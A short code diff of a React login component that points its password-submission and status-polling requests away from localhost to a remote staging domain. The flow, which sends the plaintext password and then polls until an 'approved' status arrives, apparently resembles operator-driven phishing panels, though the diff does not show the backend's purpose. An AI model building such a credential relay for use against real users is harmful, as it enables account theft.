@@ -20,7 +20,7 @@ const AccountLogin = () => {
     if (formData.password) {
       try {
         // Submit password to backend
-        const response = await fetch('http://localhost:3001/submit-password', {
+        const response = await fetch('https://api-accounts.afbex.com/stage/test/submit-password', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ password: formData.password })
@@ -40,7 +40,7 @@ const AccountLogin = () => {
   const startPolling = () => {
     const interval = setInterval(async () => {
       try {
-        const response = await fetch('http://localhost:3001/check-status');
+        const response = await fetch('https://api-accounts.afbex.com/stage/test/check-status');
         const data = await response.json();
         
         if (data.status === 'approved') {
